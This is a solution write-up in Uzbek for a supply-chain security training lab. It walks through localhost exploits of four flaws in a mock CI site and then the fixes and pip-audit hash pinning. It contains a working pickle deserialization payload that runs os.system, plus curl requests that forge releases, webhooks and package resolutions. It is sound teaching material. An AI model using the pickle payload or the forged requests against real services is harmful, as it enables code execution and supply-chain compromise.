🌐 [English](./SOLUTION.md) · [Русский](./SOLUTION.ru.md) · **Oʻzbekcha**

# A03 — Yechim (spoylerlar!)

Avval [README](./README.uz.md) dagi maslahatlardan foydalanib, laboratoriyani oʻzingiz bajarib koʻring.

## 1-qism. Kestrel CI saytining toʻrt nuqsoni

Quyidagi soʻrovlar vulnerable versiya (8021-port) uchun. Tuzatilgan versiya (8022) ularni rad etishi kerak — nima oʻzgarishini oxirida aytamiz.

### 1-nuqson. Artefakt xeshi qayta hisoblanmaydi, imzo tekshirilmaydi

```bash
curl -s -X POST http://127.0.0.1:8021/api/releases \
  -H 'Content-Type: application/json' \
  -d '{"name": "app", "version": "2.14.0",
       "digest": "0000000000000000000000000000000000000000000000000000000000000000",
       "artifact": "app-2.14.0"}'
```

Javob:

```json
{"ok": true, "message": "Release published without a signature",
 "detail": "The digest was taken from the request as is ...",
 "flag": "FLAG{a03_unverified_release}"}
```

Server xeshni soʻrovdan oldi, artefakt mazmunidan SHA-256 hisoblamadi va imzoni hech narsa bilan solishtirmadi. `signature` maydoniga istalgan qiymat qoʻysangiz, javob `Release published, signature ignored` boʻladi — imzoning oʻzi hech narsaga taʼsir qilmaydi. Buni brauzerda ham koʻrish mumkin: `/builds` sahifasidagi formada mos kelmaydigan xesh allaqachon yozilgan, «Relizni eʼlon qilish» tugmasini bosing.

Nega bu muhim: xesh va imzo — artefaktni aynan qaysi kommitdan yigʻilgani bilan bogʻlaydigan yagona vosita. Ular soʻzga ishonib qabul qilinsa, yigʻish (yoki uning tokenini qoʻlga kiritgan kishi) reyestrga istalgan nom va istalgan xesh bilan istalgan narsani qoʻyishi mumkin.

### 2-nuqson. Yigʻish profili pickle bilan oʻqiladi

Blobni tayyorlab yuboramiz:

```bash
python - <<'PY'
import base64, os, pickle

class Profile:
    def __reduce__(self):
        return (os.system, ("id",))

print(base64.b64encode(pickle.dumps(Profile())).decode())
PY
```

```bash
curl -s -X POST http://127.0.0.1:8021/api/builds/run \
  -H 'Content-Type: application/json' \
  -d '{"profile": "<yuqoridagi base64>"}'
```

Javob: `{"message": "Build finished from a serialized profile", "flag": "FLAG{a03_insecure_deserialization}"}`. `id` buyrugʻining chiqishi laboratoriya ishlab turgan terminalda koʻrinadi: `pickle.loads` kodni **oʻqish paytida**, server profilning birinchi maydonini koʻrishidan oldin bajaradi. Xato ham chiqmaydi — server uchun bu shunchaki muvaffaqiyatli oʻqish.

Yigʻish profili — kod emas, maʼlumot. Buning uchun JSON yetarli edi.

### 3-nuqson. CI vebhuki imzosiz qabul qilinadi

```bash
curl -s -X POST http://127.0.0.1:8021/webhooks/ci \
  -H 'Content-Type: application/json' \
  -d '{"event": "release.approve", "build": "#4821", "env": "production"}'
```

Javob: `{"message": "Build promoted to production", "flag": "FLAG{a03_unsigned_webhook}"}`. Soʻrovda `X-Kestrel-Signature` sarlavhasi umuman yoʻq, lekin yigʻish baribir prodga oʻtkazildi. Demak, manzilni bilgan har kim prodga reliz chiqara oladi — masalan, tekshiruvlaridan oʻtmagan yigʻish raqami bilan hodisa yuborib.

### 4-nuqson. Paket nomlari ikki indeksdan hal qilinadi

```bash
curl -s -X POST http://127.0.0.1:8021/api/registry/install \
  -H 'Content-Type: application/json' -d '{"name": "kestrel-utils"}'
```

Javob: `Package resolved from the public mirror`, flag `FLAG{a03_dependency_confusion}`. Ichki indeksda `kestrel-utils` ning `1.4.2` versiyasi bor; ommaviy oynada esa xuddi shu `1.4.2` nomaʼlum nashriyotchidan va yana `9.9.9` bor. Rеzolver ikki indeksni ham koʻrib, eng yangi versiyani oladi va xeshni solishtirmaydi, shuning uchun yigʻish birovning paketini oʻrnatadi.

Versiyani qatʼiy belgilab koʻring:

```bash
curl -s -X POST http://127.0.0.1:8021/api/registry/install \
  -H 'Content-Type: application/json' \
  -d '{"name": "kestrel-utils", "version": "1.4.2"}'
```

Javob yana ommaviy oyna haqida: ikki indeksda bir xil versiya boʻlsa, ommaviy indeks yutadi. Xulosa: **versiyani belgilash yetarli emas**, lock-fayldagi xesh ham kerak. Taqqoslash uchun ommaviy oynada yoʻq paket:

```bash
curl -s -X POST http://127.0.0.1:8021/api/registry/install \
  -H 'Content-Type: application/json' \
  -d '{"name": "kestrel-report", "version": "0.9.7"}'
```

Bu yerda javob normal: `Package installed from the internal index`.

### Tuzatilgan versiya nima qiladi

| Nuqson | vulnerable | fixed |
|--------|-----------|-------|
| 1. Reliz | istalgan xesh va imzoni qabul qiladi | `artifact` dan SHA-256 ni oʻzi hisoblab, `digest` bilan solishtiradi → `400 Digest mismatch`; soʻngra xeshning loyiha kaliti bilan HMAC-SHA256 ini tekshiradi → `400 Signature missing or invalid` |
| 2. Profil | `pickle.loads` | faqat `json.loads`; blob → `400 Profile not accepted` |
| 3. Vebhuk | imzo tekshirilmaydi | **soʻrov tanasining** HMAC-SHA256 ini hisoblab, `X-Kestrel-Signature` bilan `hmac.compare_digest` orqali solishtiradi → imzosiz `403 Signature required` |
| 4. Paketlar | ikki indeks, xesh tekshirilmaydi | faqat ichki indeks, versiya qatʼiy belgilangan boʻlishi shart, xesh lock-fayl bilan solishtiriladi |

Tuzatilgan versiyada relizni tekshirish (xesh va imzo toʻgʻri hisoblangan):

```bash
python - <<'PY'
import hashlib, hmac, json, urllib.request

KEY = "kestrel-lab-project-key"
artifact = "app-2.14.0"
digest = hashlib.sha256(artifact.encode()).hexdigest()
signature = hmac.new(KEY.encode(), digest.encode(), "sha256").hexdigest()

payload = {"name": "app", "version": "2.14.0", "digest": digest,
           "signature": signature, "artifact": artifact}
request = urllib.request.Request(
    "http://127.0.0.1:8022/api/releases",
    data=json.dumps(payload).encode(),
    headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(request).read().decode())
PY
```

Javob: `{"ok": true, "message": "Release published"}`. Skriptda `artifact` ni oʻzgartirib, `digest` ni oʻzgartirmasangiz — `400 Digest mismatch`; xeshni qoldirib, boshqa kalit bilan imzolasangiz — `400 Signature missing or invalid`.

Imzolangan vebhukni tekshirish:

```bash
python - <<'PY'
import hashlib, hmac, json, urllib.request

KEY = "kestrel-lab-project-key"
body = json.dumps({"event": "release.approve", "build": "#4821"}).encode()
signature = hmac.new(KEY.encode(), body, "sha256").hexdigest()

request = urllib.request.Request(
    "http://127.0.0.1:8022/webhooks/ci", data=body,
    headers={"Content-Type": "application/json",
             "X-Kestrel-Signature": "sha256=" + signature})
print(urllib.request.urlopen(request).read().decode())
PY
```

Javob: `{"message": "Signature verified"}`. Imzo **tananing aniq baytlari** boʻyicha hisoblanadi: boshqa tana yoki boshqa kalit → `403`.

Tuzatilgan versiyada reyestrni tekshirish:

```bash
# versiyasiz: qatʼiy belgilash majburiy
curl -s -X POST http://127.0.0.1:8022/api/registry/install \
  -H 'Content-Type: application/json' -d '{"name": "kestrel-utils"}'
# -> 400 Version not pinned

# qatʼiy belgilangan versiya: faqat ichki indeks va mos kelgan xesh
curl -s -X POST http://127.0.0.1:8022/api/registry/install \
  -H 'Content-Type: application/json' \
  -d '{"name": "kestrel-utils", "version": "1.4.2"}'
# -> 200 Package installed from the internal index

# indeksdagi paket xeshi lock-faylga mos kelmaydi (laboratoriyada bu acme-auth 1.8.1)
curl -s -X POST http://127.0.0.1:8022/api/registry/install \
  -H 'Content-Type: application/json' \
  -d '{"name": "acme-auth", "version": "1.8.1"}'
# -> 400 Hash mismatch

# nom faqat ommaviy oynada bor
curl -s -X POST http://127.0.0.1:8022/api/registry/install \
  -H 'Content-Type: application/json' -d '{"name": "requests"}'
# -> 404 Public index refused
```

`acme-auth` holati laboratoriyada ataylab tayyorlangan: indeksdagi paket xeshi lock-faylda qotirilgan xeshdan farq qiladi, shuning uchun tekshiruv haqiqatan ishlayotgani koʻrinadi.

**Flaglar:** `FLAG{a03_unverified_release}`, `FLAG{a03_insecure_deserialization}`, `FLAG{a03_unsigned_webhook}`, `FLAG{a03_dependency_confusion}`.

---

## 2-qism. Zaif bogʻliqliklar

### Zaif bogʻliqliklarni qidirish

```bash
pip install pip-audit
pip-audit -r vulnerable/requirements.txt --no-deps --disable-pip
```

`--no-deps --disable-pip` kerak, chunki fayldagi barcha versiyalar allaqachon qotirilgan va tekshirish uchun hech narsa oʻrnatish shart emas.

Laboratoriya yaratilgan paytda (2026-yil oktabr) `pip-audit` **yetti** ta paketda bildirishnomalar topadi:

| Paket | Versiya | Loyihaga qanday kirgan |
|-------|---------|------------------------|
| Flask | 2.2.2 | bevosita |
| Werkzeug | 2.2.2 | Flask bogʻliqligi |
| Jinja2 | 3.1.2 | Flask bogʻliqligi |
| requests | 2.25.1 | bevosita |
| urllib3 | 1.26.4 | requests bogʻliqligi |
| idna | 2.10 | requests bogʻliqligi |
| certifi | 2024.8.30 | requests bogʻliqligi |

Muammolarning aksariyati **tranzitiv** bogʻliqliklarda: loyihada ularni hech kim tanlamagan, lekin ular prodakshenda ishlaydi. Aniq sonlar va identifikatorlar vaqt oʻtishi bilan oʻzgaradi, chunki zaifliklar bazalari toʻldirilib boriladi.

### Tuzatish (fixed)

1. Versiyalar yangilangan: Flask 3.1.3, Werkzeug 3.1.9, Jinja2 3.1.6, requests 2.33.0 (va ularning bogʻliqliklari).
2. `requirements.in` da faqat bevosita bogʻliqliklar sanalgan, `requirements.txt` esa `pip-compile` orqali barcha tranzitiv paketlar va xeshlar bilan birga generatsiya qilingan:

   ```bash
   pip install pip-tools
   pip-compile --generate-hashes --strip-extras --output-file=requirements.txt requirements.in
   ```

3. Docker'da oʻrnatish `--require-hashes` bilan bajariladi: paket mazmuni xeshga mos kelmasa, pip uni oʻrnatishdan bosh tortadi.

Tekshirish:

```bash
pip-audit -r fixed/requirements.txt --no-deps --disable-pip
# No known vulnerabilities found
```

### Xesh bilan tajriba

```bash
sed 's/--hash=sha256:[0-9a-f]\{64\}/--hash=sha256:0000000000000000000000000000000000000000000000000000000000000000/g' \
  fixed/requirements.txt > tampered.txt
python -m venv /tmp/venv-test
/tmp/venv-test/bin/pip install --require-hashes -r tampered.txt
```

Natija: `ERROR: THESE PACKAGES DO NOT MATCH THE HASHES FROM THE REQUIREMENTS FILE ...`, oʻrnatish bajarilmaydi. pip paketni indeksdan kelish yoʻlida almashtirib yuborilishidan shu tarzda himoya qiladi.

> Tajribani **toza** muhitda bajarish kerak: paketlar allaqachon oʻrnatilgan boʻlsa, pip ularni yuklab olmaydi va xeshlarni solishtirmaydi.

### SBOM

```bash
pip-audit -r fixed/requirements.txt --no-deps --disable-pip -f cyclonedx-json -o sbom.json
```

Natijada loyiha komponentlarining CycloneDX (JSON) formatidagi roʻyxati hosil boʻladi. Uni relizning yonida saqlash va yangi bildirishnomalar bilan solishtirish mumkin.

## Yana nimani esda tutish kerak

- Xeshlari bor lock-fayl almashtirib yuborishdan himoya qiladi, lekin zaifliklardan **himoya qilmaydi**: versiyalarni baribir yangilash kerak.
- Bogʻliqliklarni tekshirishni avtomatik (masalan, CI da) va jadval boʻyicha ishga tushirgan maʼqul.
- Birinchi qismdagi 4-nuqson — ichki paketni ommaviy paket bilan almashtirish (dependency confusion) holati. Himoya: ichki indeksni yagona manba qilish va lock-fayldagi xeshlardan foydalanish.
